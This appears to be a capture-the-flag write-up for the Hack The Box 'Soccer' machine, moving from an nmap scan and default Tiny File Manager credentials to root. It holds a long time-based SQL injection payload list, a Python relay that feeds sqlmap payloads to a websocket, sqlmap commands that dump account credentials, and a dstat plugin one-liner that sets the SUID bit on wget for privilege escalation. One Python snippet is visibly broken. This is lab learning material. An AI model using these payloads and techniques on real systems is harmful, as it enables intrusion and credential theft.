Let’s start with an nmap scan

```bash
# Nmap 7.93 scan initiated Sat Jun 10 10:08:57 2023 as: nmap -sS -sC -sV -oN scans/nmap.txt 10.10.11.194
Nmap scan report for soccer.htb (10.10.11.194)
Host is up (0.28s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad0d84a3fdcc98a478fef94915dae16d (RSA)
|   256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA)
|_  256 5797565def793c2fcbdb35fff17c615c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Soccer - Index 
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 139
|     Date: Sat, 10 Jun 2023 14:09:13 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot GET /</pre>
|     </body>
|     </html>
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Sat, 10 Jun 2023 14:09:13 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9091-TCP:V=7.93%I=7%D=6/10%Time=64848403%P=x86_64-pc-linux-gnu%r(in
SF:formix,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r
SF:\n\r\n")%r(drda,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x
SF:20close\r\n\r\n")%r(GetRequest,168,"HTTP/1\.1\x20404\x20Not\x20Found\r\
SF:nContent-Security-Policy:\x20default-src\x20'none'\r\nX-Content-Type-Op
SF:tions:\x20nosniff\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nCo
SF:ntent-Length:\x20139\r\nDate:\x20Sat,\x2010\x20Jun\x202023\x2014:09:13\
SF:x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang
SF:=\"en\">\n<head>\n<meta\x20charset=\"utf-8\">\n<title>Error</title>\n</
SF:head>\n<body>\n<pre>Cannot\x20GET\x20/</pre>\n</body>\n</html>\n")%r(HT
SF:TPOptions,16C,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Pol
SF:icy:\x20default-src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\n
SF:Content-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20143\
SF:r\nDate:\x20Sat,\x2010\x20Jun\x202023\x2014:09:13\x20GMT\r\nConnection:
SF:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<me
SF:ta\x20charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>C
SF:annot\x20OPTIONS\x20/</pre>\n</body>\n</html>\n")%r(RTSPRequest,16C,"HT
SF:TP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x20default-s
SF:rc\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nContent-Type:\x20
SF:text/html;\x20charset=utf-8\r\nContent-Length:\x20143\r\nDate:\x20Sat,\
SF:x2010\x20Jun\x202023\x2014:09:13\x20GMT\r\nConnection:\x20close\r\n\r\n
SF:<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<meta\x20charset=\"u
SF:tf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot\x20OPTIONS\
SF:x20/</pre>\n</body>\n</html>\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad
SF:\x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F
SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%
SF:r(DNSStatusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnect
SF:ion:\x20close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r
SF:\nConnection:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\x
SF:20Bad\x20Request\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jun 10 10:09:20 2023 -- 1 IP address (1 host up) scanned in 22.99 seconds
```

From here we can simply visit the website

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/152be991-f7dd-4409-9d16-e25fcb09a697/Untitled.png)

Nothing cool here, so we can try to run gobuster to spot some hidden folders

```
┌──(kali㉿kali)-[~/diego/Hack_the_box/Machines/Soccer]
└─$ cat scans/gbusterSecCommon.txt 
/.htaccess            (Status: 403) [Size: 162]
/.htpasswd            (Status: 403) [Size: 162]
/tiny                 (Status: 301) [Size: 178] [--> http://soccer.htb/tiny/]
```

There is the `/tiny` page that we can visit where there is a login form

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/41970ee5-bdf3-4530-9512-14ef91e02924/Untitled.png)

By looking at the source code we can find the source code of the framework used, which is used

 https://github.com/prasathmani/tinyfilemanager

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/0cee10e2-09d1-469e-b611-d2884efb1e73/Untitled.png)

From there we can see that there are some default credentials, that we can try to use.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/26038530-a894-43e6-830a-4993a744e37e/Untitled.png)

That could be even found by searching the version online which will redirect us to an exploit of a CVE

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d4071bbd-4c53-41f1-9bcd-9f5b13ca3478/Untitled.png)

And if we try to insert them to the form we get the access

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/14b77ada-1158-4c48-8dea-c947503c0e47/Untitled.png)

Now we have to find a way to get a foothold, here its kinda easy because we just have to upload a reverse shell and open it with the direct-link

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5e7e4c74-eb99-477e-a649-d61fb13f2cb4/Untitled.png)

We just have to change the directory from tiny to uploads where we can upload and open files, then we got to listen and open the revshell

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1cf5f32a-c3b2-4a53-a9c8-f224a656d450/Untitled.png)

Now we are not allowed to get the user flag, so we got to privesc to `player`

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/af7a02d3-b085-46a3-924c-ab9097637532/Untitled.png)

From the error page we get the version of the web-server or `nginx`

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d82d2d04-3d4c-4f36-9520-ee9f95fa4e90/Untitled.png)

So we can check to the root folder of it or the `/etc/nginx` where we can find some interesting stuffs.

Like from the `/etc/nginx/sites-enabled/` we can find an interesting file or `soc-player.htb`

```bash
(remote) www-data@soccer:/etc/nginx/sites-enabled$ cat soc-player.htb 
server {
        listen 80;
        listen [::]:80;

        server_name soc-player.soccer.htb;

        root /root/app/views;

        location / {
                proxy_pass http://localhost:3000;
                proxy_http_version 1.1;
                proxy_set_header Upgrade $http_upgrade;
                proxy_set_header Connection 'upgrade';
                proxy_set_header Host $host;
                proxy_cache_bypass $http_upgrade;
        }

}
```

As you can see here seems that there is an hidden `subdomain`, so we can add it to the `/etc/hosts`, and then visit it.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/088aee0e-e262-4495-bac0-f35ad8ebb159/Untitled.png)

From there we can see that we are allowed to register and then login in it.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1cd9a3a9-3889-488b-9585-9b692fabb24a/Untitled.png)

We get redirected to the tickets page where we can’t do more but we can spot from  the source code that we are on a `websocket`

![ws:// ⇒ means that this is a websocket](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/42f0c724-46f1-4bf0-a010-b5199fe1867e/Untitled.png)

ws:// ⇒ means that this is a websocket

So we are on a websocket, this means that to interact with it we have to create a special code in python that let us to comunicate with it.

```python
import asyncio
import websockets

async def connect_websocket():
    async with websockets.connect("ws://soc-player.soccer.htb:9091/") as websocket:
        print("WebSocket connection established.")
        
        while True:

            wordlist = ""

            with open(wordlist) as list:

            message = input("Enter a message to send (or 'exit' to quit): ")
            message = '{"id":' + f'"{message}"' + "}"
            print(message)
            
            if message.lower() == 'exit':
                break
            
            await websocket.send(message)
            print("Message sent.")
            
            response = await websocket.recv()
            print("Received message:", response)
    
    print("WebSocket connection closed.")

asyncio.run(connect_websocket())
```

And here is result that we get via bash

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/080ca6f4-cff1-457a-9f97-49d9ac05854a/Untitled.png)

Like this we’ve established a comunication with the ws, and now we can try to check if it is vulnerable to something like the `SQL Injection`.

By doing some trial and error we see that there are no error messages so we have to exploit it with time-based payloads.

This is the paylaod used

```
sleep(5)#
1 or sleep(5)#
" or sleep(5)#
' or sleep(5)#
" or sleep(5)="
' or sleep(5)='
1) or sleep(5)#
") or sleep(5)="
') or sleep(5)='
1)) or sleep(5)#
")) or sleep(5)="
')) or sleep(5)='
;waitfor delay '0:0:5'--
);waitfor delay '0:0:5'--
';waitfor delay '0:0:5'--
";waitfor delay '0:0:5'--
');waitfor delay '0:0:5'--
");waitfor delay '0:0:5'--
));waitfor delay '0:0:5'--
'));waitfor delay '0:0:5'--
"));waitfor delay '0:0:5'--
benchmark(10000000,MD5(1))#
1 or benchmark(10000000,MD5(1))#
" or benchmark(10000000,MD5(1))#
' or benchmark(10000000,MD5(1))#
1) or benchmark(10000000,MD5(1))#
") or benchmark(10000000,MD5(1))#
') or benchmark(10000000,MD5(1))#
1)) or benchmark(10000000,MD5(1))#
")) or benchmark(10000000,MD5(1))#
')) or benchmark(10000000,MD5(1))#
pg_sleep(5)--
1 or pg_sleep(5)--
" or pg_sleep(5)--
' or pg_sleep(5)--
1) or pg_sleep(5)--
") or pg_sleep(5)--
') or pg_sleep(5)--
1)) or pg_sleep(5)--
")) or pg_sleep(5)--
')) or pg_sleep(5)--
AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
SLEEP(5)#
SLEEP(5)--
SLEEP(5)="
SLEEP(5)='
or SLEEP(5)
or SLEEP(5)#
or SLEEP(5)--
or SLEEP(5)="
or SLEEP(5)='
waitfor delay '00:00:05'
waitfor delay '00:00:05'--
waitfor delay '00:00:05'#
benchmark(50000000,MD5(1))
benchmark(50000000,MD5(1))--
benchmark(50000000,MD5(1))#
or benchmark(50000000,MD5(1))
or benchmark(50000000,MD5(1))--
or benchmark(50000000,MD5(1))#
pg_SLEEP(5)
pg_SLEEP(5)--
pg_SLEEP(5)#
or pg_SLEEP(5)
or pg_SLEEP(5)--
or pg_SLEEP(5)#
'\"
AnD SLEEP(5)
AnD SLEEP(5)--
AnD SLEEP(5)#
&&SLEEP(5)
&&SLEEP(5)--
&&SLEEP(5)#
' AnD SLEEP(5) ANd '1
'&&SLEEP(5)&&'1
ORDER BY SLEEP(5)
ORDER BY SLEEP(5)--
ORDER BY SLEEP(5)#
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--
+benchmark(3200,SHA1(1))+'
+ SLEEP(10) + '
RANDOMBLOB(500000000/2)
AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
RANDOMBLOB(1000000000/2)
AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

After this we have to change a bit the source code to make it send all the lines as input, with the goal to trigger some vulns

code

Here is the result

As you can see with the input `{"id":"sleep(5)"#}` we get the desired delay of 5 second and same for next input or `{"id":"1 or sleep(5)#"}`.

Knowing this we can now use a real code that automate the work of the TimeBasedSQLi, letting us to extrafiliate informations. From these documentation of [HackTricks](https://book.hacktricks.xyz/pentesting-web/sql-injection), we can even check the version of the database which is MySQL

```sql
MySQL
#comment
-- comment     [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */

PostgreSQL
--comment
/*comment*/

MSQL
--comment
/*comment*/

Oracle
--comment

SQLite
--comment
/*comment*/

HQL
HQL does not support comments
```

Now that we know it, we can try to use sqlmap to make it extract all the informations, the only problem is that we can’t simply insert the `URL` as a `POST` request, we have to ways that we can follow.

We can either use only Sqlmap as the HTB Walktrough suggest, or use this code provided by a user on [github](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html)

MIddleWare Server

```python
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import unquote, urlparse
from websocket import create_connection

ws_server = "ws://soc-player.soccer.htb:9091"

def send_ws(payload):
	ws = create_connection(ws_server)
	# If the server returns a response on connect, use below line	
	#resp = ws.recv() # If server returns something like a token on connect you can find and extract from here
	
	# For our case, format the payload in JSON
	message = unquote(payload).replace('"','\'') # replacing " with ' to avoid breaking JSON structure
	data = '{"id":"%s"}' % message

	ws.send(data)
	resp = ws.recv()
	ws.close()

	if resp:
		return resp
	else:
		return ''

def middleware_server(host_port,content_type="text/plain"):

	class CustomHandler(SimpleHTTPRequestHandler):
		def do_GET(self) -> None:
			self.send_response(200)
			try:
				payload = urlparse(self.path).query.split('=',1)[1]
			except IndexError:
				payload = False
				
			if payload:
				content = send_ws(payload)
			else:
				content = 'No parameters specified!'

			self.send_header("Content-type", content_type)
			self.end_headers()
			self.wfile.write(content.encode())
			return

	class _TCPServer(TCPServer):
		allow_reuse_address = True

	httpd = _TCPServer(host_port, CustomHandler)
	httpd.serve_forever()

print("[+] Starting MiddleWare Server")
print("[+] Send payloads in http://localhost:8081/?id=*")

try:
	middleware_server(('0.0.0.0',8081))
except KeyboardInterrupt:
	pass
```

Here we change the real cookie with the one that we need or `{'id':'*'}` , like this we can run the server from a terminal and then run sqlmap from the other by useing `http://localhost:8081/?id=1` as url

Like this we can extract whatever we want

```bash
# [0] zsh
python3 WebSocketSQLi.py
# [1] zsh
sqlmap -u "http://localhost:8081/?id=*" -p "id" -o --batch --dump --thread 30
```

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/8f5ea073-bae0-4b38-bbc2-ba5d688b8faf/Untitled.png)

Instead we can only use Sqlmap by specifying the argument that we wanna pass through the request with the `--data` flag and specifying the cookie we like.

```python
sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --threads 50 --level 5 --risk 3 --batch --dump
```

Here we added:

- `--thread` To specify the number of threads to use, ‘cause by default is 1, and the max is 10 so we changed it from the source code to a max o 50
    
    ![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/95d95ea7-69eb-4105-91ed-eb761880c8b1/Untitled.png)
    
- `--level 5` Or the max level of deepness to make it try all the possible payloads
- `--risk 3` Even here the max level for more precision
- `--batch` This will answer `Yes` to every proposed question by sqlmap
- `--dump` To make it dump the `tables`

WIth this query we can retrieve the desired content, by adding the Database and the Table

```bash
sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --threads --level 5 --risk 3 --batch -D soccer_db -T accounts --dump
```

Here are the creds for the user player.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/eec34702-3832-4c31-902e-aa9c7e5b24cd/Untitled.png)

It turned out that password is the one of the `ssh` connection.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/133909a3-1279-4601-b71a-5e17fc58072e/Untitled.png)

Now we can finally fetch the `user.txt` flag

## Root.txt

After the user we have to escalate to root, for this reason we got to fetch `linpeas.sh`, via python3 web-server

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/21cb62e0-bba1-4c00-98f9-82dc8e7af14e/Untitled.png)

By running it we can see that there is a strange command that we can run with the `SUID` bit set, or `doas`

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a931f072-fce5-4471-8a40-78d280298c8e/Untitled.png)

As you can see it is not highlited by linpeas but it can be used to become root, because in it are stored the command that some users can run without password as other users

By looking at the `doas.conf` file we can see this specifications

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/bf46e151-52db-4ad2-86df-d79bdddd26e5/Untitled.png)

Here we can see that we’re allowed to run the command `/usr/bin/dstat` as root without any password which, even it is another command that can lead to a shell if we can run it as sudo. Basically it is used to see an overview of systems in real-time.

So to get the root with it we need to run it as root, In this case we can’t use `sudo` to it but we have `doas` which does the same work as it; so by looking at this [link](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-dstat-privilege-escalation/) or even [gtfobins](https://gtfobins.github.io/gtfobins/dstat/#shell), we can simply add the `s` bit to a command to become root.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e75c0b48-c3c1-4f0d-abef-ae823bda1298/Untitled.png)

The idea is simple we got to create a new plugin that we can insert in the `/usr/local/share/dstat` folder, where the command fetch the python files as you can see below.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c8dfa952-b3fc-4ef3-8793-b4f2c266ff65/Untitled.png)

So we simply have to add a python script that add the `s` bit to a command and then run it with doas

```bash
echo 'import os; os.system("chmod +s /usr/bin/wget")' > /usr/local/share/dstat/dstat_giveMeRoot.py
```

To check if it worked we can use the command `dstat --list`

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/417d9554-ded2-4416-ad36-a845777aeb87/Untitled.png)

The plugin got added so now we can run it as `root` with `doas`

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f34487f2-50fd-4268-b5d6-e5b1e51d994e/Untitled.png)

Don’t worry about the error it worked anyway, so by checking the permission of `wget`

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a67ef6bd-be7c-48f0-88d4-829e44063274/Untitled.png)

So now we just have to follow the instruction of `[gtfobins](https://gtfobins.github.io/gtfobins/wget/#sudo)` to become root with `wget`.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1e44d39d-e179-406f-b127-5b519609af7a/Untitled.png)

By following the instructions

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/4011535d-da02-473e-ac9d-c11018269b52/Untitled.png)

And we are root so now we can fetch even the `root` flag

We did it, in about 7 days and some help 😂

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5a258fea-4b21-4b95-8f71-3dc0435aebd6/Untitled.png)
